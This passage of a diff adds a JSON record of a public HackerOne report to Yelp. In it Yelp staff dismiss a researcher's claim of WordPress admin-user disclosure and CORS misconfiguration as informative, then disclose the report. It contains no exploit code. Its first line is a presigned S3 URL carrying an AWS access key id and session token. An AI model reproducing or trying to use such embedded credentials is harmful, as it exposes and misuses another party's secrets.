+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dvCNyXMNN8EAGxaf3rzoRdKy?response-content-disposition=attachment%3B%20filename%3D%22POC2.png%22%3B%20filename%2A%3DUTF-8%27%27POC2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3ANTHS73%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072611Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIB8bLtuWLhLBe36bBDJ6rAPBxu7h%2BdoaAlbjjFCdsiO7AiEA54Z5DY5SyvrmX6uvJPAY7k5KQ8nBix8MlWqmdugzh10quwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDG977bh6X7R1EZQc8CqPBQSRFc6bgzWvfNLi0m2xGvPNUjseer1P%2Fd1SfKMdBcL2sZpI8B28aHJpC9VhOh%2B7R2okvs3wBV%2FRaXq4asfxsKY8yRdI2%2BoqO7UhDFUSDF%2BH5VvZgduO7xgl%2BcIHDbuINU8UY8X4qfS%2F0ywWG2B27GZZY1g1Ogmr6TOGbhilybHM51KAh4DFHcRrP%2FSfKJzTTbKnyJ9Wthnt8vOonzvP4J0C7KH15JJQGJz%2F8kIKDfV1zGdbpGIqk1IiucZWVEyQ%2BNwalzT4J8TOD0Bn1iMpYOiqlUAWPvqRSXJU3XDHEZUEHuXIhmWwAj7cfa9Wx3Qjzfvlck5EsgASHhy2gwI0TDLRFv199LATv6zV4aTZznyStpeqnzgz2ftoucqM4euk0wFg205gJlrVyYqLSKwWI6pljtn%2BCEKw7k%2BIl6ViKrs%2Bqi0iLkMQZJIIjDJxW8aSs%2F0OWGOrjm5MBX9jz55BlNxIQoT2VRmH1tp0Ex1kt10ARv1MHz8FzVj4zaX4SCovejtDRUm8mmcwcb%2BuFkWtF5kzLe91%2BcFfqgMAcgZ7UxSr3ajLIKuzBee0JvczodfaF3DMNWp8yoMPBEcdUc5zpNB%2FO%2FkLe8EFHhk%2BkNd%2Bv14xAkCVjBGeM1K1NZpaRC0dIccvIkQjaeSreLVyRdrNepeIKVWbnPy8gobjAdpHUlLCvE7mLqzZQHDvx4icA7xB91uI8xdKl6X68uKHbEZN4gvc1rq16vo3AUrEP6QwMfWUHQ6PDWef8vv5vCROnAJ472B8xrWK%2BOA%2FRzSQijjfvSbGiaxAsm2Bd9IH37OU35nBplokROIvNIpTWe90%2BRkL73IFI8QQbvtE47uf%2F4h%2FWEeSLy1677qofdP3UHXD0Tow2K%2B2pwY6sQGx8ON%2Fbs3%2BVDYEcInzDPiuuY2x95R8Wn4gf4dRJVl%2BaTCWAhObov3wooNwxzGOv3%2F2ulWcRg8EB6l9i1c1DrOHg3nj7ydP5nh%2BfXp9I3i%2BsR5rT%2BV%2FZiA1tYDir94IvYVyfsyu3b3l8dErmsDQ2DTcHnBUFiBNgHOKuNATRkNPYChY5ZvHGumdhAyae4kJctm2vTwKRFYI6K2YK00uFtzOPgBk4b5PFWa7e64VdTgGu%2Fg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6f5aa95f99ff860a63909bc3195cbace5afbe9aba3e7e2290b541a94bd185050"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 6895357,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @android_security,\n\nThanks for providing screenshots. We understand that the Wordpress REST API is publicly available. However an attacker can manually curl the endpoint and receive unauthenticated information. The additional threat vector would be if you can convince an authenticated user to visit your page and perform the CORS attack.\n\nWhat specific sensitive non-public data do you believe is available from the API?\n\nWe use roles to limit the permissions of our contributors / authors\nhttps://wordpress.org/support/article/roles-and-capabilities/\n\nWe don't believe the existence of the `wp-login.php` endpoint is a vulnerability. Mitigations such as rate-limiting and single sign on reduce the risk for the login endpoint.\n\nDavid",
+            "automated_response": false,
+            "created_at": "2020-01-28T21:54:23.686Z",
+            "updated_at": "2020-01-28T21:54:23.686Z",
+            "actor": {
+                "username": "dchan",
+                "cleared": false,
+                "verified": false,
+                "url": "/dchan",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 6900035,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "User admin disclousure in & CORS Misconfig in this url.",
+            "automated_response": false,
+            "created_at": "2020-01-29T15:12:50.883Z",
+            "updated_at": "2020-01-29T15:12:50.883Z",
+            "actor": {
+                "username": "deb0con",
+                "cleared": false,
+                "verified": false,
+                "url": "/deb0con",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/uuzgbpy0admz05sef76979ln16oc/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 6902542,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugInformative",
+            "message": "Hi @android_security,\n\nTo reiterate, the existence of the login page is a known risk and mitigated through other mechanisms. I do not see any disclosure of the admin user in the screenshots. We use single-sign-on for the blog.\n\nWe know about Wordpress adding the `Origin` to the CORS headers and don't believe this has meaningful impact for our use case. \n\nPlease re-open if there is some fact that we're missing.\n\nDavid",
+            "automated_response": false,
+            "created_at": "2020-01-29T19:30:44.657Z",
+            "updated_at": "2020-01-29T19:31:54.951Z",
+            "actor": {
+                "username": "dchan",
+                "cleared": false,
+                "verified": false,
+                "url": "/dchan",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 6902595,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "**Hi!** @dchan , Okey Let this disclosed",
+            "automated_response": false,
+            "created_at": "2020-01-29T19:35:29.521Z",
+            "updated_at": "2020-01-29T19:35:29.521Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "sourceflow",
+                "cleared": false,
+                "verified": false,
+                "url": "/sourceflow",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/oSheUgan3kyusfKqtzs71wLr/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 6902631,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "Hi @bellpwn,\n\nDisclosing as requested. Thanks for participating in our program.\n\nDavid",
+            "automated_response": false,
+            "created_at": "2020-01-29T19:42:39.017Z",
+            "updated_at": "2020-01-29T19:42:39.017Z",
+            "actor": {
+                "username": "dchan",
+                "cleared": false,
+                "verified": false,
+                "url": "/dchan",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 6902632,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-01-29T19:42:39.104Z",
+            "updated_at": "2020-01-29T19:42:39.104Z",
+            "actor": {
+                "username": "dchan",
+                "cleared": false,
+                "verified": false,
+                "url": "/dchan",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        },
+        {
+            "id": 8141205,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi yelp, can you Undisclosed this reports ?",
+            "automated_response": false,
+            "created_at": "2020-05-29T06:28:42.406Z",
+            "updated_at": "2020-05-29T06:28:42.406Z",
+            "actor": {
+                "username": "sourceflow",
+                "cleared": false,
+                "verified": false,
+                "url": "/sourceflow",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/oSheUgan3kyusfKqtzs71wLr/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "yelp"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
